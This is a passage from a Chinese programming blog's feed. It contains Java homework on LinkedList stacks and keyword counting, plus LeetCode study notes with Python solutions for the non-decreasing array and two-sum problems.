class="keyword">new</span> homework5_3();</span><br><span class="line">System.out.println(<span class="string">"Push string \"test1\" \"test2\" to the Stack! "</span>);</span><br><span class="line"><span class="built_in">stack</span>.push(<span class="string">"test1"</span>);</span><br><span class="line"><span class="built_in">stack</span>.push(<span class="string">"test2"</span>);</span><br><span class="line">System.out.println(<span class="string">"Start function Peek:"</span> + <span class="built_in">stack</span>.peek());</span><br><span class="line">System.out.println(<span class="string">"Start function Pop"</span>);</span><br><span class="line"><span class="built_in">stack</span>.pop();</span><br><span class="line">System.out.println(<span class="string">"Start function Peek:"</span> + <span class="built_in">stack</span>.peek());</span><br><span class="line">System.out.println(<span class="string">"Start function Pop"</span>);</span><br><span class="line"><span class="built_in">stack</span>.pop();</span><br><span class="line">System.out.println(<span class="string">"Start function Peek:"</span> + <span class="built_in">stack</span>.peek());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>运行结果<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Push <span class="keyword">string</span> <span class="string">"test1"</span> <span class="string">"test2"</span> <span class="built_in">to</span> <span class="keyword">the</span> Stack!</span><br><span class="line">Start <span class="function"><span class="keyword">function</span> <span class="title">Peek</span>:<span class="title">test2</span></span></span><br><span class="line">Start <span class="function"><span class="keyword">function</span> <span class="title">Pop</span></span></span><br><span class="line">Start <span class="function"><span class="keyword">function</span> <span class="title">Peek</span>:<span class="title">test1</span></span></span><br><span class="line">Start <span class="function"><span class="keyword">function</span> <span class="title">Pop</span></span></span><br><span class="line">Start <span class="function"><span class="keyword">function</span> <span class="title">Peek</span>:<span class="title">null</span></span></span><br></pre></td></tr></table></figure></p></blockquote><hr><blockquote><p>使用LinkedList实现一个类，该类有一个方法，该方法接受一个字符串作为参数，依次读取字符串中的字符，每次遇到“+”号就将“+”后面的一个字符压入栈中，每次遇到“-”时就将当前栈顶的字符弹出并在控制台打印，直到字符串遍历完，最后输出栈上剩余内容。实现main（）方法调用这个方法，并输入字符串”+U+n+c—+e+r+t—+a=+i-+n+t+y—+-+r+u–+1+e+s—“，观察输出。<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.lang.<span class="keyword">String</span>;</span><br><span class="line"><span class="keyword">public</span> class homework5_4&lt;E&gt; extends LinkedList&lt;E&gt;&#123;</span><br><span class="line">LinkedList&lt;<span class="keyword">String</span>&gt; stack = <span class="keyword">new</span> LinkedList&lt;<span class="keyword">String</span>&gt;();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> check(<span class="keyword">String</span> s)&#123;</span><br><span class="line"><span class="built_in">char</span> str1 = <span class="string">'+'</span>;</span><br><span class="line"><span class="built_in">char</span> str2 = <span class="string">'-'</span>;</span><br><span class="line"><span class="built_in">char</span> tmp;</span><br><span class="line"><span class="keyword">for</span>(<span class="built_in">int</span> i = <span class="number">0</span>;i&lt;s.length();i++)&#123;</span><br><span class="line"><span class="built_in">char</span> item = s.charAt(i);</span><br><span class="line"><span class="keyword">if</span>(item == str1)&#123;</span><br><span class="line"><span class="built_in">int</span> p = i+<span class="number">1</span>;</span><br><span class="line">tmp = s.charAt(p);</span><br><span class="line"><span class="keyword">String</span> <span class="built_in">str</span> = <span class="keyword">String</span>.valueOf(tmp);</span><br><span class="line">stack.addLast(<span class="built_in">str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(item == str2)&#123;</span><br><span class="line">System.out.<span class="built_in">print</span>(stack.removeLast()+<span class="string">" "</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.<span class="built_in">println</span>(<span class="string">"\nStack:"</span>);</span><br><span class="line"><span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">System.out.<span class="built_in">print</span>(stack.removeLast()+<span class="string">" "</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args) &#123;</span><br><span class="line"><span class="keyword">String</span> <span class="built_in">str</span> = <span class="string">"+U+n+c---+e+r+t---+a-+i-+n+t+y---+-+r+u--+1+e+s---"</span>;</span><br><span class="line">homework5_4 homework = <span class="keyword">new</span> homework5_4();</span><br><span class="line">homework.check(<span class="built_in">str</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>运行结果<br><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c <span class="built_in">n</span> U <span class="built_in">t</span> r e a i y <span class="built_in">t</span> <span class="built_in">n</span> - u r s e <span class="number">1</span></span><br><span class="line">Sta<span class="symbol">ck:</span></span><br></pre></td></tr></table></figure></p></blockquote><hr><blockquote><p>学习第八章中的文件输入/输出方法，从例5-6的TestMap.java中读入语句，并进行词频统计。进一步改写程序，统计TestMap.java中的Java关键字出现频率，在统计时，创建一个Set存储所有的Java关键字，在判断一个字符串记号是否为关键字时访问该Set。<br>遇到的问题：<br>TestMap.java部分关键字识别不出来<br>解决：在某些关键字周围加上分隔符空格<br>TestMap.java<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> class TestMap&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">String</span>[] s=<span class="keyword">new</span> <span class="keyword">String</span>[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">s[<span class="number">0</span>]=<span class="string">"I have a dream that one day this nation will rise up, "</span></span><br><span class="line">+ <span class="string">"live up to the true meaning of its creed: "</span></span><br><span class="line">+ <span class="string">"\"We hold these truths to be self-evident; "</span></span><br><span class="line">+ <span class="string">"that all men are created equal.\""</span>;</span><br><span class="line">s[<span class="number">1</span>]=<span class="string">"I have a dream that one day on the red hills of Georgia "</span></span><br><span class="line">+ <span class="string">"the sons of former slaves and the sons of former slave-owners "</span></span><br><span class="line">+ <span class="string">"will be able to sit down together at the table of brotherhood."</span>;</span><br><span class="line">s[<span class="number">2</span>]=<span class="string">"I have a dream that one day even the state of Mississippi, "</span></span><br><span class="line">+ <span class="string">"a state sweltering with the heat of injustice, "</span></span><br><span class="line">+ <span class="string">"sweltering with the heat of oppression, "</span></span><br><span class="line">+ <span class="string">"will be transformed into an oasis of freedom and justice"</span>;</span><br><span class="line">s[<span class="number">3</span>]=<span class="string">"I have a dream that my four children will one day live in a nation "</span></span><br><span class="line">+ <span class="string">"where they will not be judged by the color if their skin "</span></span><br><span class="line">+ <span class="string">"but by the content of their character."</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args)&#123;</span><br><span class="line">Map&lt;<span class="keyword">String</span>,Integer&gt; statistics = <span class="keyword">new</span> <span class="keyword">HashMap</span>&lt;<span class="keyword">String</span>,Integer&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;s.length;i++)&#123;</span><br><span class="line">StringTokenizer st=<span class="keyword">new</span> StringTokenizer(s[i],<span class="string">",.;:-\" "</span>);</span><br><span class="line"><span class="keyword">while</span>(st.hasMoreTokens())&#123;</span><br><span class="line"><span class="keyword">String</span> <span class="built_in">key</span>=st.nextToken();</span><br><span class="line"><span class="keyword">if</span>(statistics.<span class="built_in">get</span>(<span class="built_in">key</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">statistics.put(<span class="built_in">key</span>, statistics.<span class="built_in">get</span>(<span class="built_in">key</span>)+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">else</span> </span><br><span class="line">statistics.put(<span class="built_in">key</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.<span class="built_in">println</span>(statistics);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>代码<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> class homework5_7 &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args) &#123;</span><br><span class="line"><span class="keyword">String</span> <span class="built_in">str</span> = <span class="string">"public,abstract,assert,boolean,break,byte,case,catch,char,class,continue,default,do,double,else,enum,extends,final,finally,float,for,if,implements,import,int,interface,instanceof,long,native,new,package,private,protected,return,short,static,strictfp,super,switch,synchronized,this,throw,throws,transient,try,void,volatile,while"</span>;</span><br><span class="line">        Set &lt;<span class="keyword">String</span>&gt;actionSet = <span class="keyword">new</span> HashSet&lt;&gt;(Arrays.asList(<span class="built_in">str</span>.<span class="built_in">split</span>(<span class="string">","</span>)));</span><br><span class="line">        Map &lt;<span class="keyword">String</span>,Integer&gt;keywords  = <span class="keyword">new</span> <span class="keyword">HashMap</span>&lt;<span class="keyword">String</span>,Integer&gt;();</span><br><span class="line">        System.out.<span class="built_in">print</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="keyword">String</span> s = <span class="string">""</span>;</span><br><span class="line">        File file = <span class="keyword">new</span> File(<span class="string">"TestMap.java"</span>);</span><br><span class="line">        FileInputStream fis = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line">            <span class="built_in">int</span> content;</span><br><span class="line">            <span class="keyword">while</span> ((content = fis.read()) != <span class="number">-1</span>) &#123;</span><br><span class="line">                s += (<span class="built_in">char</span>)content;</span><br><span class="line">            &#125;</span><br><span class="line">            StringTokenizer st = <span class="keyword">new</span> StringTokenizer(s,<span class="string">",; ()&#123;&#125;.="</span>);</span><br><span class="line">            <span class="keyword">while</span>(st.hasMoreTokens())&#123;</span><br><span class="line"><span class="keyword">String</span> <span class="built_in">key</span>=st.nextToken();     </span><br><span class="line"><span class="keyword">if</span>(actionSet.contains(<span class="built_in">key</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(keywords.<span class="built_in">get</span>(<span class="built_in">key</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">keywords.put(<span class="built_in">key</span>, keywords.<span class="built_in">get</span>(<span class="built_in">key</span>)+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">keywords.put(<span class="built_in">key</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.<span class="built_in">println</span>(keywords);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (fis != <span class="keyword">null</span>)</span><br><span class="line">                    fis.close();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">                ex.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>运行结果<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attribute">new</span>=3, <span class="attribute">static</span>=3, <span class="attribute">void</span>=1, <span class="attribute">import</span>=1, <span class="attribute">public</span>=2, <span class="attribute">this</span>=1, <span class="attribute">for</span>=1, <span class="attribute">while</span>=1, <span class="attribute">class</span>=1, <span class="attribute">if</span>=2, <span class="attribute">int</span>=1&#125;</span><br></pre></td></tr></table></figure></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 开发相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>非递减数列</title>
      <link href="/2019/10/23/%E9%9D%9E%E9%80%92%E5%87%8F%E6%95%B0%E5%88%97/"/>
      <url>/2019/10/23/%E9%9D%9E%E9%80%92%E5%87%8F%E6%95%B0%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h2 id="LeetCode刷题笔记"><a href="#LeetCode刷题笔记" class="headerlink" title="LeetCode刷题笔记"></a>LeetCode刷题笔记</h2><h3 id="非递减数列"><a href="#非递减数列" class="headerlink" title="非递减数列"></a>非递减数列</h3><p><strong>题目链接：<a href="https://leetcode-cn.com/problems/non-decreasing-array/submissions/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/non-decreasing-array/submissions/</a></strong></p><hr><blockquote><p>给定一个长度为 n 的整数数组，你的任务是判断在最多改变 1 个元素的情况下，该数组能否变成一个非递减数列。</p></blockquote><p>我们是这样定义一个非递减数列的： 对于数组中所有的 i (1 &lt;= i &lt; n)，满足 array[i] &lt;= array[i + 1]。<br><a id="more"></a><br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">示例 1:</span><br><span class="line"><span class="section">输入: [4,2,3]</span></span><br><span class="line"><span class="section">输出: True</span></span><br><span class="line"><span class="section">解释: 你可以通过把第一个4变成1来使得它成为一个非递减数列。</span></span><br><span class="line">示例 2:</span><br><span class="line"><span class="section">输入: [4,2,1]</span></span><br><span class="line"><span class="section">输出: False</span></span><br><span class="line"><span class="section">解释: 你不能在只改变一个元素的情况下将其变为非递减数列。</span></span><br><span class="line"><span class="section">说明:  n 的范围为 [1, 10,000]。</span></span><br></pre></td></tr></table></figure></p><hr><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><blockquote><p>写这个题的时候脑子昏昏沉沉的，写了半天总是不对，看了下大佬的思路，然后就思路清晰~<br>此题只能改变一次，所以建立一个flag保存改变次数，如果改变次数大于1，直接return False<br>发现nums[i] &gt; nums[i+1]时有两种选择使它变成非递减数列</p><ol><li>nums[i]   = nums[i+1]</li><li>nums[i+1] = nums[i]<br>第一种情况时需要考虑将nums[i] = nums[i+1]后，因为已经判断过nums[i] &gt;= nums[i-1]成立，而nums[i] = nums[i+1]语句运行后，nums[i]变小了，需要再次判断是否nums[i] &gt;= nums[i-1],如果nums[i] &lt; nums[i-1]，则进入第二种情况。<br>第二种情况将nums[i+1] = nums[i]并没有什么特别之处，因为循环是往后运行的，可以检查出是否会有问题</li></ol></blockquote><table><thead><tr><th>提交结果</th><th>执行用时</th><th>内存消耗</th><th>语言</th></tr></thead><tbody><tr><td>超出时间限制</td><td>240 ms</td><td>15.1 MB</td><td>Python3</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkPossibility</span><span class="params">(self, nums: List[int])</span> -&gt; bool:</span></span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        tmp  = <span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span>(nums[i]&gt;nums[i+<span class="number">1</span>]):</span><br><span class="line">                flag -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span>(flag&lt;<span class="number">0</span>):</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">                k = nums[i]</span><br><span class="line">                <span class="comment">#将nums[i]的值改为nums[i+1]的值</span></span><br><span class="line">                nums[i] = nums[i+<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">if</span>(nums[i]&lt;nums[i<span class="number">-1</span>] <span class="keyword">and</span> i&gt;=<span class="number">1</span>):</span><br><span class="line">                    nums[i] = k</span><br><span class="line">                <span class="comment">#将nums[i+1]的值改为nums[i]的值</span></span><br><span class="line">                    nums[i+<span class="number">1</span>] = nums[i]</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure><hr><blockquote><p>这个题题解数目较少，python3解法大同小异，找到另一个题解，思路和我的一样，不过写的更清晰</p></blockquote><table><thead><tr><th>提交结果</th><th>执行用时</th><th>内存消耗</th><th>语言</th></tr></thead><tbody><tr><td>超出时间限制</td><td>236 ms</td><td>15.1 MB</td><td>Python3</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkPossibility</span><span class="params">(self, nums: List[int])</span> -&gt; bool:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span> nums[i] &gt; nums[i+<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">                    nums[<span class="number">0</span>]=nums[<span class="number">1</span>]</span><br><span class="line">                <span class="keyword">elif</span> nums[i<span class="number">-1</span>]&gt;nums[i+<span class="number">1</span>]:</span><br><span class="line">                    nums[i+<span class="number">1</span>]=nums[i]</span><br><span class="line">                <span class="keyword">elif</span> nums[i<span class="number">-1</span>]&lt;nums[i+<span class="number">1</span>]:</span><br><span class="line">                    nums[i]=nums[i<span class="number">-1</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)<span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">if</span> nums[i] &gt; nums[i+<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> LeetCode刷题笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode刷题笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>两数之和</title>
      <link href="/2019/10/14/%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/"/>
      <url>/2019/10/14/%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="LeetCode刷题笔记"><a href="#LeetCode刷题笔记" class="headerlink" title="LeetCode刷题笔记"></a>LeetCode刷题笔记</h2><h3 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h3><p><strong>题目链接：<a href="https://leetcode-cn.com/problems/two-sum/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/two-sum/</a></strong></p><hr><blockquote><p>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。<br>你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。<br><a id="more"></a><br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">示例:</span><br><span class="line">给定 nums = <span class="string">[2, 7, 11, 15]</span>, target = <span class="number">9</span></span><br><span class="line">因为 nums<span class="string">[0]</span> + nums<span class="string">[1]</span> = <span class="number">2</span> + <span class="number">7</span> = <span class="number">9</span></span><br><span class="line">所以返回 <span class="string">[0, 1]</span></span><br></pre></td></tr></table></figure></p></blockquote><hr><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><blockquote><p>首先是最原始，最直接的代码，但是这个代码超时了，<del>但是作为笔记，反思自己的愚蠢/算法不够机智是应该的</del><br>该方法是利用两个for循环，第一个for循环遍历nums的元素，记为number，第二个for循环遍历number之后的元素，记为number0，然后相加检验是否为target，如果是则将两个元素加入answer，然后跳出循环，如果不是，则继续循环。</p></blockquote><table><thead><tr><th>提交结果</th><th>执行用时</th><th>内存消耗</th><th>语言</th></tr></thead><tbody><tr><td>超出时间限制</td><td>N/A</td><td>N/A</td><td>Python3</td></tr></tbody></table><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def twoSum(self, num<span class="variable">s:</span> List[<span class="keyword">int</span>], targe<span class="variable">t:</span> <span class="keyword">int</span>) -&gt; List[<span class="keyword">int</span>]:</span><br><span class="line">        answer = []</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">number</span> in <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">for</span> number0 in <span class="built_in">range</span>(<span class="keyword">number</span>+<span class="number">1</span>,<span class="built_in">len</span>(nums)):</span><br><span class="line">                <span class="keyword">if</span>((nums[<span class="keyword">number</span>]+nums[number0])==target):</span><br><span class="line">                    answer.<span class="keyword">append</span>(<span class="keyword">number</span>)</span><br><span class="line">                    answer.<span class="keyword">append</span>(number0)</span><br><span class="line">                    flag = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span>(flag == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> answer</span><br></pre></td></tr></table></figure><blockquote><p>之后是从大佬那里看来的思路，利用python3带的in方法，一个for循环遍历nums元素，记为left，利用target-left_index得到的值，记为right，利用in方法检测是否在left之后的列表里，如果在，则把当前遍历元素之后的元素拿出来，检测第一个出现right，然后返回</p></blockquote><table><thead><tr><th>提交结果</th><th>执行用时</th><th>内存消耗</th><th>语言</th></tr></thead><tbody><tr><td>通过</td><td>852ms</td><td>14.2MB</td><td>Python3</td></tr></tbody></table><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def twoSum(self, num<span class="variable">s:</span> List[<span class="keyword">int</span>], targe<span class="variable">t:</span> <span class="keyword">int</span>) -&gt; List[<span class="keyword">int</span>]:</span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">left</span> in <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">right</span> = target - nums[<span class="keyword">left</span>]</span><br><span class="line">            i = nums[<span class="keyword">left</span>+<span class="number">1</span>:]</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">right</span> in i):</span><br><span class="line">                <span class="keyword">x</span> = i.<span class="built_in">index</span>(<span class="keyword">right</span>)</span><br><span class="line">                <span class="keyword">x</span> = <span class="keyword">x</span> + <span class="keyword">left</span> + <span class="number">1</span></span><br><span class="line">                <span class="keyword">return</span> [<span class="keyword">left</span>,<span class="keyword">x</span>]</span><br><span class="line">        <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure><blockquote><p>enumerate产生一个有下标值和对应值的列表，一个一个遍历nums，如果不在字典里，就把target-当前遍历值即当前需要的值加入字典，并解释为当前遍历值的下标，等遍历到需要的那个值，就直接查找是否在字典里，如果在，说明前面遍历时有某个值恰好加上当前遍历的值即为target，取对应的：值即为需要的下标，返回即可</p></blockquote><table><thead><tr><th>提交结果</th><th>执行用时</th><th>内存消耗</th><th>语言</th></tr></thead><tbody><tr><td>通过</td><td>68ms</td><td>15MB</td><td>Python3</td></tr></tbody></table><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">twoSum</span>(<span class="title">self</span>, <span class="title">nums</span>: <span class="title">List</span>[<span class="title">int</span>], <span class="title">target</span>: <span class="title">int</span>) -&gt; <span class="title">List</span>[<span class="title">int</span>]:</span></span><br><span class="line"><span class="class">        <span class="title">dic</span> = </span>&#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i, <span class="built_in">num</span> <span class="keyword">in</span> enumerate(nums):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">num</span> <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">return</span> [dic[<span class="built_in">num</span>], i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dic[target - <span class="built_in">num</span>] = i</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> LeetCode刷题笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode刷题笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>整数反转</title>
      <link href="/2019/10/14/%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC/"/>
      <url>/2019/10/14/%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC/</url>
      
